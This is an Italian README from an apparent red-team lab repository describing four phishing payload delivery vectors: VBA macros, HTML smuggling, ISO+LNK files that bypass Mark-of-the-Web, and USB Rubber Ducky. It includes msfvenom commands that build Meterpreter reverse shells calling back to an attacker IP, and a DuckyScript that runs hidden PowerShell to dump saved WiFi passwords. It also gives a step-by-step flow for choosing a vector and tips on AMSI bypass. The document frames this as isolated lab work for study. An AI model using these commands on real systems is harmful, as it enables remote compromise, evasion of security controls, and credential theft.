> [English](README.en.md) | **Italiano**

# 03 - Payload delivery

> - **Fase:** Social Engineering - Payload Delivery (consegna codice malevolo al target)
> - **Visibilita:** Alta - i vettori di delivery interagiscono con email gateway, proxy, endpoint protection; l'esecuzione del payload triggera EDR/AV; i file allegati sono analizzati da sandbox automatiche
> - **Prerequisiti:** Payload generato (msfvenom, Empire stager, o custom); per macro VBA: Microsoft Office con macro abilitate sul target; per HTML Smuggling: conoscenza JavaScript; per ISO+LNK: tool di creazione immagini ISO; per Rubber Ducky: hardware Hak5 o emulatore
> - **Output:** Finding SE-007..010; payload eseguiti su macchina target tramite quattro vettori di delivery distinti; reverse shell o credential esfiltration ottenuta in ciascun scenario

---

## Introduzione

Il Payload Delivery e la fase della kill chain in cui il codice malevolo viene fisicamente consegnato alla vittima e ne viene ottenuta l'esecuzione. Mentre la sezione `01-phishing-campaigns` si concentra sulla raccolta di credenziali e la sezione `02-social-engineer-toolkit` fornisce il framework multi-vettore, questa sezione documenta in dettaglio le tecniche specifiche di weaponization e delivery.

L'evoluzione dei vettori di delivery riflette la corsa tra attaccanti e difensori:

1. **Macro VBA (SE-007):** la tecnica classica (pre-2022). Un documento Word/Excel con macro malevola che, una volta abilitata dall'utente, esegue uno stager PowerShell. Microsoft ha disabilitato le macro VBA di default per file con Mark-of-the-Web a partire da luglio 2022, riducendone l'efficacia ma non eliminandola in ambienti legacy.

2. **HTML Smuggling (SE-008):** tecnica moderna che bypassa i filtri email gateway. Il codice JavaScript nell'email/pagina HTML assembla il file malevolo direttamente nel browser della vittima tramite Blob API, eludendo i controlli server-side che analizzano solo allegati statici.

3. **ISO + LNK (SE-009):** la risposta degli attaccanti al blocco delle macro. I file ISO non portano il Mark-of-the-Web quando montati su Windows, e i file LNK al loro interno eseguono comandi arbitrari senza che SmartScreen intervenga. Tecnica dominante nel 2022-2024.

4. **USB Rubber Ducky (SE-010):** attacco fisico tramite dispositivo HID. Il Rubber Ducky si presenta come una tastiera e inietta sequenze di tasti pre-programmate a velocita sovraumana.

---

## Struttura della cartella

```
03-payload-delivery/
+-- malicious-macros/     # VBA macro reverse shell (tecnica classica) - SE-007
+-- html-smuggling/       # Bypass email gateway via blob JS - SE-008
+-- iso-lnk-delivery/     # Post-macro kill: MotW bypass chain - SE-009
+-- usb-rubber-ducky/     # HID attack fisico - SE-010
```

---

## `malicious-macros/` - VBA macro reverse shell

**ID Finding:** `SE-007` | **Severity:** `Alto` (macro VBA esegue stager PowerShell per reverse shell)

### Contesto operativo

Il laboratorio ha documentato la creazione di un documento Word con macro VBA che, quando abilitata dall'utente, esegue uno stager PowerShell encoded per reverse shell Meterpreter. La tecnica e legacy post-2022, ma resta rilevante per ambienti Office con macro abilitate (aziende con dipendenze legacy, file provenienti da share interni senza MotW).

### Comandi principali

```Bash
# Generazione payload VBA con msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f vba-psh -o macro_payload.vba
```

---

## `html-smuggling/` - Bypass email gateway

**ID Finding:** `SE-008` | **Severity:** `Alto` (payload .exe ricostruito lato client, bypass filtri server-side)

### Contesto operativo

HTML Smuggling sfrutta le API JavaScript (Blob, URL.createObjectURL) per assemblare un file malevolo direttamente nel browser della vittima. L'email contiene solo codice JavaScript legittimo: il payload e codificato in Base64 all'interno dello script e viene decodificato e offerto come download quando la vittima apre la pagina. I filtri email gateway non eseguono JavaScript, rendendo questa tecnica altamente efficace.

### Comandi principali

```Bash
# Generazione payload e encoding Base64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o update.exe
base64 -w 0 update.exe > payload_b64.txt
```

---

## `iso-lnk-delivery/` - Mark-of-the-Web bypass

**ID Finding:** `SE-009` | **Severity:** `Critico` (esecuzione payload senza MotW, bypass SmartScreen)

### Contesto operativo

Dopo il blocco delle macro VBA (luglio 2022), gli attaccanti hanno adottato una nuova delivery chain: file ISO contenenti un LNK (shortcut) e il payload. Windows monta l'ISO come drive virtuale e i file al suo interno non ereditano il Mark-of-the-Web, il flag che attiva SmartScreen. Il LNK, con icona camuffata da documento, esegue il payload senza intervento di SmartScreen.

### Comandi principali

```Bash
# Creazione payload e immagine ISO
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o payload.exe
mkisofs -o delivery.iso -J -r ./iso_contents/
```

---

## `usb-rubber-ducky/` - HID attack fisico

**ID Finding:** `SE-010` | **Severity:** `Alto` (esfiltrazione credenziali WiFi in < 30 secondi)

### Contesto operativo

Il Rubber Ducky (Hak5) si presenta al sistema come una tastiera HID e inietta sequenze di tasti a velocita sovraumana. Il laboratorio ha documentato uno script DuckyScript che estrae le credenziali WiFi salvate su Windows, completando l'operazione in meno di 30 secondi.

### Comandi principali

```Bash
# DuckyScript per esfiltrazione WiFi (Windows)
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "(netsh wlan show profiles)|Select-String ':(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name=$n key=clear)}|Out-File $env:TEMP\wifi.txt"
ENTER
```

---

## Flusso operativo consigliato

```
[1] Scelta del vettore
     +-- Target con macro abilitate? -------> Malicious Macros (SE-007)
     +-- Email gateway blocca allegati? ----> HTML Smuggling (SE-008)
     +-- Target Windows 10/11 standard? ----> ISO + LNK (SE-009)
     +-- Accesso fisico al target? ---------> USB Rubber Ducky (SE-010)
              |
              v
[2] Weaponization
     +-- msfvenom: generazione payload per il vettore scelto
     +-- Embedding: VBA macro / Base64 JS / ISO+LNK / DuckyScript
              |
              v
[3] Delivery
     +-- Email (SE-007, SE-008): invio tramite GoPhish o SET
     +-- Link (SE-009): hosting ISO su server controllato
     +-- Fisico (SE-010): inserimento USB nel target
              |
              v
[4] Execution & Callback
     +-- Handler Metasploit in ascolto
     +-- Reverse shell / credential esfiltration
```

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `msfvenom` | payload generator | cli | generazione payload in tutti i formati (vba, exe, ps1, dll) |
| `mkisofs` / `genisoimage` | iso creator | cli | creazione immagini iso per delivery chain |
| `Rubber Ducky` | hid attack | hardware + duckyscript | iniezione keystroke automatizzata via usb |
| `macro_pack` | office weaponizer | cli - python | offuscamento macro vba e generazione documenti office malevoli |
| `Unicorn` | ps payload generator | cli - python | generazione payload powershell encoded per delivery |
| `Donut` | shellcode generator | cli | conversione .net assembly in shellcode position-independent |

> **Tool moderno consigliato:** `macro_pack` per offuscamento avanzato delle macro VBA (bypass AMSI). Per delivery moderna (2024-2026), la combinazione ISO+LNK sta cedendo il passo a Windows Shortcut exploitation (CVE-2024-21412) e OneNote attachments. `Donut` per conversione di qualsiasi .NET/PE in shellcode iniettabile.

---

## Registro finding

| id | descrizione | severity | cvss | sottocartella |
| :--- | :--- | :---: | :---: | :--- |
| `SE-007` | macro vba: documento word con macro che esegue stager powershell encoded per reverse shell meterpreter | `Alto` | 7.8 | `malicious-macros/` |
| `SE-008` | html smuggling: payload .exe ricostruito lato client via blob javascript, bypass email gateway | `Alto` | 8.1 | `html-smuggling/` |
| `SE-009` | iso + lnk: payload eseguito senza mark-of-the-web, bypass smartscreen e macro block | `Critico` | 9.1 | `iso-lnk-delivery/` |
| `SE-010` | usb rubber ducky: esfiltrazione credenziali wifi salvate in < 30 secondi via hid injection | `Alto` | 7.2 | `usb-rubber-ducky/` |

---

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | finding correlato |
| :--- | :--- | :--- | :--- |
| resource development | develop capabilities: malware | `T1587.001` | SE-007, SE-008, SE-009 |
| initial access | phishing: spearphishing attachment | `T1566.001` | SE-007, SE-008, SE-009 |
| initial access | replication through removable media | `T1091` | SE-010 |
| execution | user execution: malicious file | `T1204.002` | SE-007, SE-009, SE-010 |
| execution | command and scripting interpreter: powershell | `T1059.001` | SE-007, SE-008 |
| execution | command and scripting interpreter: visual basic | `T1059.005` | SE-007 |
| defense evasion | subvert trust controls: mark-of-the-web bypass | `T1553.005` | SE-009 |
| defense evasion | obfuscated files or information: html smuggling | `T1027.006` | SE-008 |
| collection | input capture: credential api hooking | `T1056.004` | SE-010 |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato (VirtualBox, rete NAT/Bridge isolata). I payload sono stati eseguiti esclusivamente su macchine virtuali di proprieta dell'autore. Nessun payload e stato consegnato a sistemi o persone reali.
